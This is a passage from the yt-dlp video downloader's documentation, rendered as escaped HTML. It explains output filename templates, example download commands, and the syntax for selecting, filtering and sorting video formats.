&lt;p&gt;Available only when using &lt;code&gt;--download-sections&lt;/code&gt; and for &lt;code&gt;chapter:&lt;/code&gt; prefix when using &lt;code&gt;--split-chapters&lt;/code&gt; for videos with internal chapters:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;section_title&lt;/code&gt; (string): Title of the chapter&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;section_number&lt;/code&gt; (numeric): Number of the chapter within the file&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;section_start&lt;/code&gt; (numeric): Start time of the chapter in seconds&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;section_end&lt;/code&gt; (numeric): End time of the chapter in seconds&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Available only when used in &lt;code&gt;--print&lt;/code&gt;:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;urls&lt;/code&gt; (string): The URLs of all requested formats, one in each line&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;filename&lt;/code&gt; (string): Name of the video file. Note that the &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#outtmpl-postprocess-note"&gt;actual filename may differ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;formats_table&lt;/code&gt; (table): The video format table as printed by &lt;code&gt;--list-formats&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;thumbnails_table&lt;/code&gt; (table): The thumbnail format table as printed by &lt;code&gt;--list-thumbnails&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;subtitles_table&lt;/code&gt; (table): The subtitle format table as printed by &lt;code&gt;--list-subs&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;automatic_captions_table&lt;/code&gt; (table): The automatic subtitle format table as printed by &lt;code&gt;--list-subs&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Available only after the video is downloaded (&lt;code&gt;post_process&lt;/code&gt;/&lt;code&gt;after_move&lt;/code&gt;):&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;filepath&lt;/code&gt;: Actual path of downloaded video file&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Available only in &lt;code&gt;--sponsorblock-chapter-title&lt;/code&gt;:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;start_time&lt;/code&gt; (numeric): Start time of the chapter in seconds&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;end_time&lt;/code&gt; (numeric): End time of the chapter in seconds&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;categories&lt;/code&gt; (list): The &lt;a href="https://wiki.sponsor.ajay.app/w/Types#Category"&gt;SponsorBlock categories&lt;/a&gt; the chapter belongs to&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;category&lt;/code&gt; (string): The smallest SponsorBlock category the chapter belongs to&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;category_names&lt;/code&gt; (list): Friendly names of the categories&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;name&lt;/code&gt; (string): Friendly name of the smallest category&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;type&lt;/code&gt; (string): The &lt;a href="https://wiki.sponsor.ajay.app/w/Types#Action_Type"&gt;SponsorBlock action type&lt;/a&gt; of the chapter&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Each aforementioned sequence when referenced in an output template will be replaced by the actual value corresponding to the sequence name. E.g. for &lt;code&gt;-o %(title)s-%(id)s.%(ext)s&lt;/code&gt; and an mp4 video with title &lt;code&gt;yt-dlp test video&lt;/code&gt; and id &lt;code&gt;BaW_jenozKc&lt;/code&gt;, this will result in a &lt;code&gt;yt-dlp test video-BaW_jenozKc.mp4&lt;/code&gt; file created in the current directory.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Some of the sequences are not guaranteed to be present, since they depend on the metadata obtained by a particular extractor. Such sequences will be replaced with placeholder value provided with &lt;code&gt;--output-na-placeholder&lt;/code&gt; (&lt;code&gt;NA&lt;/code&gt; by default).&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Tip&lt;/strong&gt;: Look at the &lt;code&gt;-j&lt;/code&gt; output to identify which fields are available for the particular URL&lt;/p&gt; 
&lt;p&gt;For numeric sequences, you can use &lt;a href="https://docs.python.org/3/library/stdtypes.html#printf-style-string-formatting"&gt;numeric related formatting&lt;/a&gt;; e.g. &lt;code&gt;%(view_count)05d&lt;/code&gt; will result in a string with view count padded with zeros up to 5 characters, like in &lt;code&gt;00042&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;Output templates can also contain arbitrary hierarchical path, e.g. &lt;code&gt;-o "%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s"&lt;/code&gt; which will result in downloading each video in a directory corresponding to this path template. Any missing directory will be automatically created for you.&lt;/p&gt; 
&lt;p&gt;To use percent literals in an output template use &lt;code&gt;%%&lt;/code&gt;. To output to stdout use &lt;code&gt;-o -&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;The current default template is &lt;code&gt;%(title)s [%(id)s].%(ext)s&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;In some cases, you don't want special characters such as ‰∏≠, spaces, or &amp;amp;, such as when transferring the downloaded filename to a Windows system or the filename through an 8bit-unsafe channel. In these cases, add the &lt;code&gt;--restrict-filenames&lt;/code&gt; flag to get a shorter title.&lt;/p&gt; 
&lt;h4&gt;Output template examples&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;$ yt-dlp --print filename -o "test video.%(ext)s" BaW_jenozKc
test video.webm    # Literal name with correct extension

$ yt-dlp --print filename -o "%(title)s.%(ext)s" BaW_jenozKc
youtube-dl test video ''_√§‚Ü≠ùïê.webm    # All kinds of weird characters

$ yt-dlp --print filename -o "%(title)s.%(ext)s" BaW_jenozKc --restrict-filenames
youtube-dl_test_video_.webm    # Restricted file name

# Download YouTube playlist videos in separate directory indexed by video order in a playlist
$ yt-dlp -o "%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s" "https://www.youtube.com/playlist?list=PLwiyx1dc3P2JR9N8gQaQN_BCvlSlap7re"

# Download YouTube playlist videos in separate directories according to their uploaded year
$ yt-dlp -o "%(upload_date&amp;gt;%Y)s/%(title)s.%(ext)s" "https://www.youtube.com/playlist?list=PLwiyx1dc3P2JR9N8gQaQN_BCvlSlap7re"

# Prefix playlist index with " - " separator, but only if it is available
$ yt-dlp -o "%(playlist_index&amp;amp;{} - |)s%(title)s.%(ext)s" BaW_jenozKc "https://www.youtube.com/user/TheLinuxFoundation/playlists"

# Download all playlists of YouTube channel/user keeping each playlist in separate directory:
$ yt-dlp -o "%(uploader)s/%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s" "https://www.youtube.com/user/TheLinuxFoundation/playlists"

# Download Udemy course keeping each chapter in separate directory under MyVideos directory in your home
$ yt-dlp -u user -p password -P "~/MyVideos" -o "%(playlist)s/%(chapter_number)s - %(chapter)s/%(title)s.%(ext)s" "https://www.udemy.com/java-tutorial"

# Download entire series season keeping each series and each season in separate directory under C:/MyVideos
$ yt-dlp -P "C:/MyVideos" -o "%(series)s/%(season_number)s - %(season)s/%(episode_number)s - %(episode)s.%(ext)s" "https://videomore.ru/kino_v_detalayah/5_sezon/367617"

# Download video as "C:\MyVideos\uploader\title.ext", subtitles as "C:\MyVideos\subs\uploader\title.ext"
# and put all temporary files in "C:\MyVideos\tmp"
$ yt-dlp -P "C:/MyVideos" -P "temp:tmp" -P "subtitle:subs" -o "%(uploader)s/%(title)s.%(ext)s" BaW_jenozKc --write-subs

# Download video as "C:\MyVideos\uploader\title.ext" and subtitles as "C:\MyVideos\uploader\subs\title.ext"
$ yt-dlp -P "C:/MyVideos" -o "%(uploader)s/%(title)s.%(ext)s" -o "subtitle:%(uploader)s/subs/%(title)s.%(ext)s" BaW_jenozKc --write-subs

# Stream the video being downloaded to stdout
$ yt-dlp -o - BaW_jenozKc
&lt;/code&gt;&lt;/pre&gt; 
&lt;h1&gt;FORMAT SELECTION&lt;/h1&gt; 
&lt;p&gt;By default, yt-dlp tries to download the best available quality if you &lt;strong&gt;don't&lt;/strong&gt; pass any options. This is generally equivalent to using &lt;code&gt;-f bestvideo*+bestaudio/best&lt;/code&gt;. However, if multiple audiostreams is enabled (&lt;code&gt;--audio-multistreams&lt;/code&gt;), the default format changes to &lt;code&gt;-f bestvideo+bestaudio/best&lt;/code&gt;. Similarly, if ffmpeg is unavailable, or if you use yt-dlp to stream to &lt;code&gt;stdout&lt;/code&gt; (&lt;code&gt;-o -&lt;/code&gt;), the default becomes &lt;code&gt;-f best/bestvideo+bestaudio&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Deprecation warning&lt;/strong&gt;: Latest versions of yt-dlp can stream multiple formats to the stdout simultaneously using ffmpeg. So, in future versions, the default for this will be set to &lt;code&gt;-f bv*+ba/b&lt;/code&gt; similar to normal downloads. If you want to preserve the &lt;code&gt;-f b/bv+ba&lt;/code&gt; setting, it is recommended to explicitly specify it in the configuration options.&lt;/p&gt; 
&lt;p&gt;The general syntax for format selection is &lt;code&gt;-f FORMAT&lt;/code&gt; (or &lt;code&gt;--format FORMAT&lt;/code&gt;) where &lt;code&gt;FORMAT&lt;/code&gt; is a &lt;em&gt;selector expression&lt;/em&gt;, i.e. an expression that describes format or formats you would like to download.&lt;/p&gt; 
&lt;!-- MANPAGE: BEGIN EXCLUDED SECTION --&gt; 
&lt;p&gt;&lt;strong&gt;tl;dr:&lt;/strong&gt; &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#format-selection-examples"&gt;navigate me to examples&lt;/a&gt;.&lt;/p&gt; 
&lt;!-- MANPAGE: END EXCLUDED SECTION --&gt; 
&lt;p&gt;The simplest case is requesting a specific format; e.g. with &lt;code&gt;-f 22&lt;/code&gt; you can download the format with format code equal to 22. You can get the list of available format codes for particular video using &lt;code&gt;--list-formats&lt;/code&gt; or &lt;code&gt;-F&lt;/code&gt;. Note that these format codes are extractor specific.&lt;/p&gt; 
&lt;p&gt;You can also use a file extension (currently &lt;code&gt;3gp&lt;/code&gt;, &lt;code&gt;aac&lt;/code&gt;, &lt;code&gt;flv&lt;/code&gt;, &lt;code&gt;m4a&lt;/code&gt;, &lt;code&gt;mp3&lt;/code&gt;, &lt;code&gt;mp4&lt;/code&gt;, &lt;code&gt;ogg&lt;/code&gt;, &lt;code&gt;wav&lt;/code&gt;, &lt;code&gt;webm&lt;/code&gt; are supported) to download the best quality format of a particular file extension served as a single file, e.g. &lt;code&gt;-f webm&lt;/code&gt; will download the best quality format with the &lt;code&gt;webm&lt;/code&gt; extension served as a single file.&lt;/p&gt; 
&lt;p&gt;You can use &lt;code&gt;-f -&lt;/code&gt; to interactively provide the format selector &lt;em&gt;for each video&lt;/em&gt;&lt;/p&gt; 
&lt;p&gt;You can also use special names to select particular edge case formats:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;all&lt;/code&gt;: Select &lt;strong&gt;all formats&lt;/strong&gt; separately&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;mergeall&lt;/code&gt;: Select and &lt;strong&gt;merge all formats&lt;/strong&gt; (Must be used with &lt;code&gt;--audio-multistreams&lt;/code&gt;, &lt;code&gt;--video-multistreams&lt;/code&gt; or both)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;b*&lt;/code&gt;, &lt;code&gt;best*&lt;/code&gt;: Select the best quality format that &lt;strong&gt;contains either&lt;/strong&gt; a video or an audio or both (i.e.; &lt;code&gt;vcodec!=none or acodec!=none&lt;/code&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;b&lt;/code&gt;, &lt;code&gt;best&lt;/code&gt;: Select the best quality format that &lt;strong&gt;contains both&lt;/strong&gt; video and audio. Equivalent to &lt;code&gt;best*[vcodec!=none][acodec!=none]&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;bv&lt;/code&gt;, &lt;code&gt;bestvideo&lt;/code&gt;: Select the best quality &lt;strong&gt;video-only&lt;/strong&gt; format. Equivalent to &lt;code&gt;best*[acodec=none]&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;bv*&lt;/code&gt;, &lt;code&gt;bestvideo*&lt;/code&gt;: Select the best quality format that &lt;strong&gt;contains video&lt;/strong&gt;. It may also contain audio. Equivalent to &lt;code&gt;best*[vcodec!=none]&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ba&lt;/code&gt;, &lt;code&gt;bestaudio&lt;/code&gt;: Select the best quality &lt;strong&gt;audio-only&lt;/strong&gt; format. Equivalent to &lt;code&gt;best*[vcodec=none]&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ba*&lt;/code&gt;, &lt;code&gt;bestaudio*&lt;/code&gt;: Select the best quality format that &lt;strong&gt;contains audio&lt;/strong&gt;. It may also contain video. Equivalent to &lt;code&gt;best*[acodec!=none]&lt;/code&gt; (&lt;a href="https://github.com/yt-dlp/yt-dlp/issues/979#issuecomment-919629354"&gt;Do not use!&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;w*&lt;/code&gt;, &lt;code&gt;worst*&lt;/code&gt;: Select the worst quality format that contains either a video or an audio&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;w&lt;/code&gt;, &lt;code&gt;worst&lt;/code&gt;: Select the worst quality format that contains both video and audio. Equivalent to &lt;code&gt;worst*[vcodec!=none][acodec!=none]&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;wv&lt;/code&gt;, &lt;code&gt;worstvideo&lt;/code&gt;: Select the worst quality video-only format. Equivalent to &lt;code&gt;worst*[acodec=none]&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;wv*&lt;/code&gt;, &lt;code&gt;worstvideo*&lt;/code&gt;: Select the worst quality format that contains video. It may also contain audio. Equivalent to &lt;code&gt;worst*[vcodec!=none]&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;wa&lt;/code&gt;, &lt;code&gt;worstaudio&lt;/code&gt;: Select the worst quality audio-only format. Equivalent to &lt;code&gt;worst*[vcodec=none]&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;wa*&lt;/code&gt;, &lt;code&gt;worstaudio*&lt;/code&gt;: Select the worst quality format that contains audio. It may also contain video. Equivalent to &lt;code&gt;worst*[acodec!=none]&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;For example, to download the worst quality video-only format you can use &lt;code&gt;-f worstvideo&lt;/code&gt;. It is, however, recommended not to use &lt;code&gt;worst&lt;/code&gt; and related options. When your format selector is &lt;code&gt;worst&lt;/code&gt;, the format which is worst in all respects is selected. Most of the time, what you actually want is the video with the smallest filesize instead. So it is generally better to use &lt;code&gt;-S +size&lt;/code&gt; or more rigorously, &lt;code&gt;-S +size,+br,+res,+fps&lt;/code&gt; instead of &lt;code&gt;-f worst&lt;/code&gt;. See &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#sorting-formats"&gt;Sorting Formats&lt;/a&gt; for more details.&lt;/p&gt; 
&lt;p&gt;You can select the n'th best format of a type by using &lt;code&gt;best&amp;lt;type&amp;gt;.&amp;lt;n&amp;gt;&lt;/code&gt;. For example, &lt;code&gt;best.2&lt;/code&gt; will select the 2nd best combined format. Similarly, &lt;code&gt;bv*.3&lt;/code&gt; will select the 3rd best format that contains a video stream.&lt;/p&gt; 
&lt;p&gt;If you want to download multiple videos, and they don't have the same formats available, you can specify the order of preference using slashes. Note that formats on the left hand side are preferred; e.g. &lt;code&gt;-f 22/17/18&lt;/code&gt; will download format 22 if it's available, otherwise it will download format 17 if it's available, otherwise it will download format 18 if it's available, otherwise it will complain that no suitable formats are available for download.&lt;/p&gt; 
&lt;p&gt;If you want to download several formats of the same video use a comma as a separator, e.g. &lt;code&gt;-f 22,17,18&lt;/code&gt; will download all these three formats, of course if they are available. Or a more sophisticated example combined with the precedence feature: &lt;code&gt;-f 136/137/mp4/bestvideo,140/m4a/bestaudio&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;You can merge the video and audio of multiple formats into a single file using &lt;code&gt;-f &amp;lt;format1&amp;gt;+&amp;lt;format2&amp;gt;+...&lt;/code&gt; (requires ffmpeg installed); e.g. &lt;code&gt;-f bestvideo+bestaudio&lt;/code&gt; will download the best video-only format, the best audio-only format and mux them together with ffmpeg.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Deprecation warning&lt;/strong&gt;: Since the &lt;em&gt;below&lt;/em&gt; described behavior is complex and counter-intuitive, this will be removed and multistreams will be enabled by default in the future. A new operator will be instead added to limit formats to single audio/video&lt;/p&gt; 
&lt;p&gt;Unless &lt;code&gt;--video-multistreams&lt;/code&gt; is used, all formats with a video stream except the first one are ignored. Similarly, unless &lt;code&gt;--audio-multistreams&lt;/code&gt; is used, all formats with an audio stream except the first one are ignored. E.g. &lt;code&gt;-f bestvideo+best+bestaudio --video-multistreams --audio-multistreams&lt;/code&gt; will download and merge all 3 given formats. The resulting file will have 2 video streams and 2 audio streams. But &lt;code&gt;-f bestvideo+best+bestaudio --no-video-multistreams&lt;/code&gt; will download and merge only &lt;code&gt;bestvideo&lt;/code&gt; and &lt;code&gt;bestaudio&lt;/code&gt;. &lt;code&gt;best&lt;/code&gt; is ignored since another format containing a video stream (&lt;code&gt;bestvideo&lt;/code&gt;) has already been selected. The order of the formats is therefore important. &lt;code&gt;-f best+bestaudio --no-audio-multistreams&lt;/code&gt; will download only &lt;code&gt;best&lt;/code&gt; while &lt;code&gt;-f bestaudio+best --no-audio-multistreams&lt;/code&gt; will ignore &lt;code&gt;best&lt;/code&gt; and download only &lt;code&gt;bestaudio&lt;/code&gt;.&lt;/p&gt; 
&lt;h2&gt;Filtering Formats&lt;/h2&gt; 
&lt;p&gt;You can also filter the video formats by putting a condition in brackets, as in &lt;code&gt;-f "best[height=720]"&lt;/code&gt; (or &lt;code&gt;-f "[filesize&amp;gt;10M]"&lt;/code&gt; since filters without a selector are interpreted as &lt;code&gt;best&lt;/code&gt;).&lt;/p&gt; 
&lt;p&gt;The following numeric meta fields can be used with comparisons &lt;code&gt;&amp;lt;&lt;/code&gt;, &lt;code&gt;&amp;lt;=&lt;/code&gt;, &lt;code&gt;&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;gt;=&lt;/code&gt;, &lt;code&gt;=&lt;/code&gt; (equals), &lt;code&gt;!=&lt;/code&gt; (not equals):&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;filesize&lt;/code&gt;: The number of bytes, if known in advance&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;filesize_approx&lt;/code&gt;: An estimate for the number of bytes&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;width&lt;/code&gt;: Width of the video, if known&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;height&lt;/code&gt;: Height of the video, if known&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;aspect_ratio&lt;/code&gt;: Aspect ratio of the video, if known&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;tbr&lt;/code&gt;: Average bitrate of audio and video in &lt;a href="##" title="1000 bits/sec"&gt;kbps&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;abr&lt;/code&gt;: Average audio bitrate in &lt;a href="##" title="1000 bits/sec"&gt;kbps&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;vbr&lt;/code&gt;: Average video bitrate in &lt;a href="##" title="1000 bits/sec"&gt;kbps&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;asr&lt;/code&gt;: Audio sampling rate in Hertz&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;fps&lt;/code&gt;: Frame rate&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;audio_channels&lt;/code&gt;: The number of audio channels&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;stretched_ratio&lt;/code&gt;: &lt;code&gt;width:height&lt;/code&gt; of the video's pixels, if not square&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Also filtering work for comparisons &lt;code&gt;=&lt;/code&gt; (equals), &lt;code&gt;^=&lt;/code&gt; (starts with), &lt;code&gt;$=&lt;/code&gt; (ends with), &lt;code&gt;*=&lt;/code&gt; (contains), &lt;code&gt;~=&lt;/code&gt; (matches regex) and following string meta fields:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;url&lt;/code&gt;: Video URL&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ext&lt;/code&gt;: File extension&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;acodec&lt;/code&gt;: Name of the audio codec in use&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;vcodec&lt;/code&gt;: Name of the video codec in use&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;container&lt;/code&gt;: Name of the container format&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;protocol&lt;/code&gt;: The protocol that will be used for the actual download, lower-case (&lt;code&gt;http&lt;/code&gt;, &lt;code&gt;https&lt;/code&gt;, &lt;code&gt;rtsp&lt;/code&gt;, &lt;code&gt;rtmp&lt;/code&gt;, &lt;code&gt;rtmpe&lt;/code&gt;, &lt;code&gt;mms&lt;/code&gt;, &lt;code&gt;f4m&lt;/code&gt;, &lt;code&gt;ism&lt;/code&gt;, &lt;code&gt;http_dash_segments&lt;/code&gt;, &lt;code&gt;m3u8&lt;/code&gt;, or &lt;code&gt;m3u8_native&lt;/code&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;language&lt;/code&gt;: Language code&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;dynamic_range&lt;/code&gt;: The dynamic range of the video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;format_id&lt;/code&gt;: A short description of the format&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;format&lt;/code&gt;: A human-readable description of the format&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;format_note&lt;/code&gt;: Additional info about the format&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;resolution&lt;/code&gt;: Textual description of width and height&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Any string comparison may be prefixed with negation &lt;code&gt;!&lt;/code&gt; in order to produce an opposite comparison, e.g. &lt;code&gt;!*=&lt;/code&gt; (does not contain). The comparand of a string comparison needs to be quoted with either double or single quotes if it contains spaces or special characters other than &lt;code&gt;._-&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: None of the aforementioned meta fields are guaranteed to be present since this solely depends on the metadata obtained by the particular extractor, i.e. the metadata offered by the website. Any other field made available by the extractor can also be used for filtering.&lt;/p&gt; 
&lt;p&gt;Formats for which the value is not known are excluded unless you put a question mark (&lt;code&gt;?&lt;/code&gt;) after the operator. You can combine format filters, so &lt;code&gt;-f "bv[height&amp;lt;=?720][tbr&amp;gt;500]"&lt;/code&gt; selects up to 720p videos (or videos where the height is not known) with a bitrate of at least 500 kbps. You can also use the filters with &lt;code&gt;all&lt;/code&gt; to download all formats that satisfy the filter, e.g. &lt;code&gt;-f "all[vcodec=none]"&lt;/code&gt; selects all audio-only formats.&lt;/p&gt; 
&lt;p&gt;Format selectors can also be grouped using parentheses; e.g. &lt;code&gt;-f "(mp4,webm)[height&amp;lt;480]"&lt;/code&gt; will download the best pre-merged mp4 and webm formats with a height lower than 480.&lt;/p&gt; 
&lt;h2&gt;Sorting Formats&lt;/h2&gt; 
&lt;p&gt;You can change the criteria for being considered the &lt;code&gt;best&lt;/code&gt; by using &lt;code&gt;-S&lt;/code&gt; (&lt;code&gt;--format-sort&lt;/code&gt;). The general format for this is &lt;code&gt;--format-sort field1,field2...&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;The available fields are:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;hasvid&lt;/code&gt;: Gives priority to formats that have a video stream&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;hasaud&lt;/code&gt;: Gives priority to formats that have an audio stream&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ie_pref&lt;/code&gt;: The format preference&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;lang&lt;/code&gt;: The language preference as determined by the extractor (e.g. original language preferred over audio description)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;quality&lt;/code&gt;: The quality of the format&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;source&lt;/code&gt;: The preference of the source&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;proto&lt;/code&gt;: Protocol used for download (&lt;code&gt;https&lt;/code&gt;/&lt;code&gt;ftps&lt;/code&gt; &amp;gt; &lt;code&gt;http&lt;/code&gt;/&lt;code&gt;ftp&lt;/code&gt; &amp;gt; &lt;code&gt;m3u8_native&lt;/code&gt;/&lt;code&gt;m3u8&lt;/code&gt; &amp;gt; &lt;code&gt;http_dash_segments&lt;/code&gt;&amp;gt; &lt;code&gt;websocket_frag&lt;/code&gt; &amp;gt; &lt;code&gt;mms&lt;/code&gt;/&lt;code&gt;rtsp&lt;/code&gt; &amp;gt; &lt;code&gt;f4f&lt;/code&gt;/&lt;code&gt;f4m&lt;/code&gt;)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;vcodec&lt;/code&gt;: Video Codec (&lt;code&gt;av01&lt;/code&gt; &amp;gt; &lt;code&gt;vp9.2&lt;/code&gt; &amp;gt; &lt;code&gt;vp9&lt;/code&gt; &amp;gt; &lt;code&gt;h265&lt;/code&gt; &amp;gt; &lt;code&gt;h264&lt;/code&gt; &amp;gt; &lt;code&gt;vp8&lt;/code&gt; &amp;gt; &lt;code&gt;h263&lt;/code&gt; &amp;gt; &lt;code&gt;theora&lt;/code&gt; &amp;gt; other)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;acodec&lt;/code&gt;: Audio Codec (&lt;code&gt;flac&lt;/code&gt;/&lt;code&gt;alac&lt;/code&gt; &amp;gt; &lt;code&gt;wav&lt;/code&gt;/&lt;code&gt;aiff&lt;/code&gt; &amp;gt; &lt;code&gt;opus&lt;/code&gt; &amp;gt; &lt;code&gt;vorbis&lt;/code&gt; &amp;gt; &lt;code&gt;aac&lt;/code&gt; &amp;gt; &lt;code&gt;mp4a&lt;/code&gt; &amp;gt; &lt;code&gt;mp3&lt;/code&gt; &amp;gt; &lt;code&gt;ac4&lt;/code&gt; &amp;gt; &lt;code&gt;eac3&lt;/code&gt; &amp;gt; &lt;code&gt;ac3&lt;/code&gt; &amp;gt; &lt;code&gt;dts&lt;/code&gt; &amp;gt; other)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;codec&lt;/code&gt;: Equivalent to &lt;code&gt;vcodec,acodec&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;vext&lt;/code&gt;: Video Extension (&lt;code&gt;mp4&lt;/code&gt; &amp;gt; &lt;code&gt;mov&lt;/code&gt; &amp;gt; &lt;code&gt;webm&lt;/code&gt; &amp;gt; &lt;code&gt;flv&lt;/code&gt; &amp;gt; other). If &lt;code&gt;--prefer-free-formats&lt;/code&gt; is used, &lt;code&gt;webm&lt;/code&gt; is preferred.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;aext&lt;/code&gt;: Audio Extension (&lt;code&gt;m4a&lt;/code&gt; &amp;gt; &lt;code&gt;aac&lt;/code&gt; &amp;gt; &lt;code&gt;mp3&lt;/code&gt; &amp;gt; &lt;code&gt;ogg&lt;/code&gt; &amp;gt; &lt;code&gt;opus&lt;/code&gt; &amp;gt; &lt;code&gt;webm&lt;/code&gt; &amp;gt; other). If &lt;code&gt;--prefer-free-formats&lt;/code&gt; is used, the order changes to &lt;code&gt;ogg&lt;/code&gt; &amp;gt; &lt;code&gt;opus&lt;/code&gt; &amp;gt; &lt;code&gt;webm&lt;/code&gt; &amp;gt; &lt;code&gt;mp3&lt;/code&gt; &amp;gt; &lt;code&gt;m4a&lt;/code&gt; &amp;gt; &lt;code&gt;aac&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ext&lt;/code&gt;: Equivalent to &lt;code&gt;vext,aext&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;filesize&lt;/code&gt;: Exact filesize, if known in advance&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;fs_approx&lt;/code&gt;: Approximate filesize&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;size&lt;/code&gt;: Exact filesize if available, otherwise approximate filesize&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;height&lt;/code&gt;: Height of video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;width&lt;/code&gt;: Width of video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;res&lt;/code&gt;: Video resolution, calculated as the smallest dimension.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;fps&lt;/code&gt;: Framerate of video&lt;/li&gt; 
